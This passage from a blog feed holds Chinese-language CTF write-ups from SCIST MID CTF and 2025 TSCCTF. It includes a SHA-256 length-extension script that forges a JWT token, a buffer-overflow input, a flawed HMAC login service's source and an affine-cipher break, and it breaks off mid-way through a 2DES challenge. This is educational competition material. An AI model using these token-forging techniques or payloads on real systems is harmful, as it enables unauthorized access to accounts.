class="number">0x5b9cca4f</span>, <span class="number">0x682e6ff3</span>,</span><br><span class="line">            <span class="number">0x748f82ee</span>, <span class="number">0x78a5636f</span>, <span class="number">0x84c87814</span>, <span class="number">0x8cc70208</span>,</span><br><span class="line">            <span class="number">0x90befffa</span>, <span class="number">0xa4506ceb</span>, <span class="number">0xbef9a3f7</span>, <span class="number">0xc67178f2</span>,</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            s1 = rightrotate(e, <span class="number">6</span>) ^ rightrotate(e, <span class="number">11</span>) ^ rightrotate(e, <span class="number">25</span>)</span><br><span class="line">            ch = (e &amp; f) ^ ((~e) &amp; g)</span><br><span class="line">            temp1 = (h_val + s1 + ch + k[i] + w[i]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            s0 = rightrotate(a, <span class="number">2</span>) ^ rightrotate(a, <span class="number">13</span>) ^ rightrotate(a, <span class="number">22</span>)</span><br><span class="line">            maj = (a &amp; b) ^ (a &amp; c) ^ (b &amp; c)</span><br><span class="line">            temp2 = (s0 + maj) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">            h_val = g</span><br><span class="line">            g = f</span><br><span class="line">            f = e</span><br><span class="line">            e = (d + temp1) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            d = c</span><br><span class="line">            c = b</span><br><span class="line">            b = a</span><br><span class="line">            a = (temp1 + temp2) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">0</span>] = (<span class="variable language_">self</span>.h[<span class="number">0</span>] + a) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">1</span>] = (<span class="variable language_">self</span>.h[<span class="number">1</span>] + b) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">2</span>] = (<span class="variable language_">self</span>.h[<span class="number">2</span>] + c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">3</span>] = (<span class="variable language_">self</span>.h[<span class="number">3</span>] + d) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">4</span>] = (<span class="variable language_">self</span>.h[<span class="number">4</span>] + e) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">5</span>] = (<span class="variable language_">self</span>.h[<span class="number">5</span>] + f) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">6</span>] = (<span class="variable language_">self</span>.h[<span class="number">6</span>] + g) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="variable language_">self</span>.h[<span class="number">7</span>] = (<span class="variable language_">self</span>.h[<span class="number">7</span>] + h_val) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 根據 SHA256 規範進行填充：先加上 0x80，再補 0x00 至長度 mod 64 為 56，最後加上 8 字節的位元長度</span></span><br><span class="line">        ml = <span class="variable language_">self</span>.message_byte_length * <span class="number">8</span></span><br><span class="line">        pad = <span class="string">b'\x80'</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable language_">self</span>.message_byte_length + <span class="built_in">len</span>(pad)) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">            pad += <span class="string">b'\x00'</span></span><br><span class="line">        pad += struct.pack(<span class="string">'&gt;Q'</span>, ml)</span><br><span class="line">        <span class="keyword">return</span> pad</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">digest</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 暫存目前狀態</span></span><br><span class="line">        h_backup = <span class="variable language_">self</span>.h[:]</span><br><span class="line">        unprocessed_backup = <span class="variable language_">self</span>.unprocessed</span><br><span class="line">        message_byte_length_backup = <span class="variable language_">self</span>.message_byte_length</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.update(<span class="variable language_">self</span>._padding())</span><br><span class="line">        result = <span class="string">b''</span>.join(struct.pack(<span class="string">'&gt;I'</span>, h) <span class="keyword">for</span> h <span class="keyword">in</span> <span class="variable language_">self</span>.h)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 還原狀態</span></span><br><span class="line">        <span class="variable language_">self</span>.h = h_backup</span><br><span class="line">        <span class="variable language_">self</span>.unprocessed = unprocessed_backup</span><br><span class="line">        <span class="variable language_">self</span>.message_byte_length = message_byte_length_backup</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ml = secret_length + <span class="built_in">len</span>(message)</span><br><span class="line">glue_padding = <span class="string">b'\x80'</span></span><br><span class="line"><span class="keyword">while</span> (ml + <span class="built_in">len</span>(glue_padding)) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">    glue_padding += <span class="string">b'\x00'</span></span><br><span class="line">glue_padding += (ml * <span class="number">8</span>).to_bytes(<span class="number">8</span>, <span class="string">'big'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Glue padding (hex):"</span>, glue_padding.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">new_message = message + glue_padding + append_data</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"New message:"</span>, new_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 使用自訂 SHA256 進行長度延展攻擊</span></span><br><span class="line"><span class="comment"># 初始已處理位元組數：secret + message + glue_padding</span></span><br><span class="line">initial_count = secret_length + <span class="built_in">len</span>(message) + <span class="built_in">len</span>(glue_padding)</span><br><span class="line"><span class="comment"># 將原始 hash 轉換為初始狀態（8 個 32 位元整數）</span></span><br><span class="line">h = [<span class="built_in">int</span>.from_bytes(hash_ori[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">'big'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">sha = SHA256(state=h, count=initial_count)</span><br><span class="line">sha.update(append_data)</span><br><span class="line">new_hash_extension = sha.digest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"New hash (extension attack):"</span>, new_hash_extension)</span><br><span class="line"></span><br><span class="line">new_sig = long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(new_hash_extension), d, n))</span><br><span class="line"></span><br><span class="line">new_body = new_message.split(<span class="string">b"."</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"token:"</span> + new_encode(ori_header) + <span class="string">"."</span> + new_encode(new_body) + <span class="string">"."</span> + new_encode(new_sig))</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/JNBweOL.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>flag:<code>SCIST{It's a bad practice to implement RS256 of JWT.}</code></p><p>P.S. 為什麼找不到網路上可以用來解 sha256 LEA的工具或是腳本啊啊啊，<del>其實 LEA 那部份主要是詠唱出來的</del></p><h2 id="welcome">Welcome <a href="#welcome" class="headerlink"></a></h2><h3 id="catch-the-flag">CATCH THE FLAG! <a href="#catch-the-flag" class="headerlink"></a></h3><p>在首頁的 console 看到</p><figure><img data-src="https://i.imgur.com/Y91Vjo0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>到 <code>[robots.txt](https://mid.ctf.scist.org/robots.txt)</code>看到</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow:/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==</span><br></pre></td></tr></tbody></table></figure><p>進到 <code>/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==</code> 發現</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">"E.1O9_w3lc0mE}"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>找到第二段 flag <code>E.1O9_w3lc0mE}</code> ，就成功ㄌ</p><p>flag: <code>SCIST{c0Ns01E.1O9_w3lc0mE}</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;scist-mid-ctf-writeup&quot;&gt;SCIST MID CTF Writeup &lt;a href=&quot;#scist-mid-ctf-writeup&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;figure&gt;
&lt;img data-src=&quot;https://i.imgur.com/I5lei4J.png&quot; alt=&quot;Image&quot;&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;Image&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;我是 SCIST_31 /&lt;/p&gt;</summary>
    
    
    
    <category term="資安" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/categories/%E8%B3%87%E5%AE%89/CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="TSCCTF" scheme="https://moon-jam.me/tags/TSCCTF/"/>
    
    <category term="Writeup" scheme="https://moon-jam.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>2025 TSCCTF Writeup</title>
    <link href="https://moon-jam.me/2025_TSCCTF_Writeup/"/>
    <id>https://moon-jam.me/2025_TSCCTF_Writeup/</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.304Z</updated>
    
    <content type="html"><![CDATA[<p>在 Qualified Scoreboard 第五，全部人的第 41，嗚嗚被虐爛了</p><figure><img data-src="https://i.imgur.com/IGyLku7.png" alt="Qualified Scoreboard"><figcaption aria-hidden="true">Qualified Scoreboard</figcaption></figure><figure><img data-src="https://i.imgur.com/bImlzwR.png" alt="Overall Scoreboard"><figcaption aria-hidden="true">Overall Scoreboard</figcaption></figure><span id="more"></span><h2 id="welcome">Welcome <a href="#welcome" class="headerlink"></a></h2><h3 id="give-you-a-free-flag">Give you a free flag <a href="#give-you-a-free-flag" class="headerlink"></a></h3><p>把底下反白就出現了</p><figure><img data-src="https://hackmd.io/_uploads/rkot-bzwyx.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{W3llc0me_t0_TSC2O2SIlIllI}</code></p><h3 id="please-join-our-discord">Please Join Our Discord!!! <a href="#please-join-our-discord" class="headerlink"></a></h3><p>在 DC 翻一翻就找到了 OuO 但我看到去年的交了大概 20 幾筆錯的 flagw</p><figure><img data-src="https://hackmd.io/_uploads/rJoFoSfPyl.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{w31c0m3_t0_t5cc7f2025_d15c0rd!!!}</code></p><h3 id="feedback-form">Feedback Form <a href="#feedback-form" class="headerlink"></a></h3><p>就填表單</p><figure><img data-src="https://hackmd.io/_uploads/SJO9i1UPyx.png" alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>flag: <code>TSC{thanks_for_playing_and_c_u_nexy_year!}</code></p><h2 id="pwn">Pwn <a href="#pwn" class="headerlink"></a></h2><h3 id="gamble_bad_bad">gamble_bad_bad <a href="#gamble_bad_bad" class="headerlink"></a></h3><p>為了讓 <code>strcmp(game.jackpot_value, "777") == 0</code> 成立，用Buffer Overflow</p><p>輸入: <code>AAAAAAAAAAAAAAAAAAAA777</code></p><p>flag: <code>TSC{Gamb1e_Very_bad_bad_but_}</code></p><h2 id="crypto">Crypto <a href="#crypto" class="headerlink"></a></h2><h3 id="very-simple-login">Very Simple Login <a href="#very-simple-login" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">message0: <span class="built_in">bytes</span>, message1: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(byte0 &amp; byte1 <span class="keyword">for</span> byte0, byte1 <span class="keyword">in</span> <span class="built_in">zip</span>(message0, message1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(message).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hmac_sha256</span>(<span class="params">key: <span class="built_in">bytes</span>, message: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocksize = <span class="number">64</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) &gt; blocksize:</span><br><span class="line">        key = sha256(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) &lt; blocksize:</span><br><span class="line">        key = key + <span class="string">b'\x00'</span> * (blocksize - <span class="built_in">len</span>(key))</span><br><span class="line">    o_key_pad = xor(<span class="string">b'\x5c'</span> * blocksize, key)</span><br><span class="line">    i_key_pad = xor(<span class="string">b'\x3c'</span> * blocksize, key)</span><br><span class="line">    <span class="keyword">return</span> sha256(o_key_pad + sha256(i_key_pad) + message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_jwt_dumps</span>(<span class="params">data: <span class="built_in">dict</span>, exp: <span class="built_in">int</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    header = {<span class="string">'alg'</span>: <span class="string">'HS256'</span>, <span class="string">'typ'</span>: <span class="string">'JWT'</span>}</span><br><span class="line">    payload = {<span class="string">'sub'</span>: data, <span class="string">'exp'</span>: exp}</span><br><span class="line">    header = base64.urlsafe_b64encode(json.dumps(header).encode())</span><br><span class="line">    payload = base64.urlsafe_b64encode(json.dumps(payload).encode())</span><br><span class="line">    signature = hmac_sha256(key, header + <span class="string">b'.'</span> + payload)</span><br><span class="line">    signature = base64.urlsafe_b64encode(signature).rstrip(<span class="string">b'='</span>)</span><br><span class="line">    <span class="keyword">return</span> header + <span class="string">b'.'</span> + payload + <span class="string">b'.'</span> + signature</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_jwt_loads</span>(<span class="params">jwt: <span class="built_in">bytes</span>, exp: <span class="built_in">int</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">dict</span> | <span class="literal">None</span>:</span><br><span class="line">    header_payload, signature = jwt.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    sig = hmac_sha256(key, header_payload)</span><br><span class="line">    sig = base64.urlsafe_b64encode(sig).rstrip(<span class="string">b'='</span>)</span><br><span class="line">    <span class="keyword">if</span> sig != signature:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header, payload = header_payload.split(<span class="string">b'.'</span>)[<span class="number">0</span>], header_payload.split(<span class="string">b'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">        header = json.loads(base64.urlsafe_b64decode(header))</span><br><span class="line">        payload = json.loads(base64.urlsafe_b64decode(payload))</span><br><span class="line">        <span class="keyword">if</span> (header.get(<span class="string">'alg'</span>) != <span class="string">'HS256'</span>) <span class="keyword">or</span> (header.get(<span class="string">'typ'</span>) != <span class="string">'JWT'</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(payload.get(<span class="string">'exp'</span>)) &lt; exp:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'JWT error'</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.get(<span class="string">'sub'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username: <span class="built_in">str</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">if</span> re.fullmatch(<span class="string">r'[A-z0-9]+'</span>, username) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"'username' format error."</span>)</span><br><span class="line">    <span class="keyword">return</span> sha256_jwt_dumps({<span class="string">'username'</span>: username}, <span class="built_in">int</span>(time.time()) + <span class="number">86400</span>, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">token: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    userdata = sha256_jwt_loads(token, <span class="built_in">int</span>(time.time()), key)</span><br><span class="line">    <span class="keyword">return</span> userdata[<span class="string">'username'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'=================='</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'1. Register'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'2. Login'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'3. Exit'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">'&gt; '</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= choice &lt;= <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> choice</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Error choice !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = os.urandom(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        choice = menu()</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            username = <span class="built_in">input</span>(<span class="string">'Username &gt; '</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                token = register(username, key)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'Username Error !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f'Token : <span class="subst">{token.<span class="built_in">hex</span>()}</span>'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">            token = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">'Token &gt; '</span>))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                username = login(token, key)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'Token Error !'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">            <span class="keyword">if</span> username == <span class="string">'Admin'</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f'FLAG : <span class="subst">{FLAG}</span>'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">'FLAG : TSC{???}'</span>, end=<span class="string">'\n\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">3</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></tbody></table></figure><p>程式裡沒有檢查或限制使用者是否能以 “Admin” 作為帳號，因此只要註冊“Admin” 並成功獲得 Token，再使用該 Token 進行登入就可以得到 FLAG。</p><p>flag: <code>TSC{Wr0nG_HM4C_7O_L3A_!!!}</code></p><h3 id="classic">Classic <a href="#classic" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">"FLAG"</span>) <span class="keyword">or</span> <span class="string">"TSC{test_flag}"</span></span><br><span class="line"></span><br><span class="line">charset = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">A, B = secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>), secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>((A * x + B) % <span class="built_in">len</span>(charset) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charset)))) == <span class="built_in">len</span>(charset)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">""</span>.join(charset[(charset.find(c) * A + B) % <span class="built_in">len</span>(charset)] <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></tbody></table></figure><p>加密後的 flag : <code>o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"</code></p><p>加密方法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">charset = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">A, B = secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>), secrets.randbelow(<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>((A * x + B) % <span class="built_in">len</span>(charset) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(charset)))) == <span class="built_in">len</span>(charset)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">""</span>.join(charset[(charset.find(c) * A + B) % <span class="built_in">len</span>(charset)] <span class="keyword">for</span> c <span class="keyword">in</span> flag)</span><br></pre></td></tr></tbody></table></figure><p>已知：</p><ul><li>T-&gt;o : (55 * A + B) % 94 = 24</li><li>S-&gt;` : (54 * A + B) % 94 = 89</li><li>C-&gt;1 : (38 * A + B) % 94 = 1</li><li>{-&gt;5 : (90 * A + B) % 94 = 5</li><li>}-&gt;” : (92 * A + B) % 94 = 63</li></ul><p>從前兩個可以知道：1 * A % 94 = 24-89 = -65 = 29<br>用後兩個驗證一下：2 * A % 94 = 63-5 = 58</p><p>可以直接假設 A = 29 <span class="math inline">\(\rightarrow\)</span>(55 * A + B) % 94 = (91 + B) % 94 = 24 <span class="math inline">\(\rightarrow\)</span> 假設 B = 27</p><p>驗證一下 (92 * 29 + 27) % 94 = 63 沒錯</p><p>接著就</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">50</span>]: <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    ...:     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">94</span>):</span><br><span class="line">    ...:         <span class="keyword">if</span> ((i*A + B) % <span class="number">94</span> == charset.find(c)):</span><br><span class="line">    ...:             <span class="built_in">print</span>(charset[i], end=<span class="string">""</span>)</span><br><span class="line">    ...: </span><br><span class="line">TSC{c14551c5_c1ph3r5_4r5_fr4g17e}</span><br></pre></td></tr></tbody></table></figure><p>flag: <code>TSC{c14551c5_c1ph3r5_4r5_fr4g17e}</code></p><h3 id="des">2DES <a href="#des" class="headerlink"></a></h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 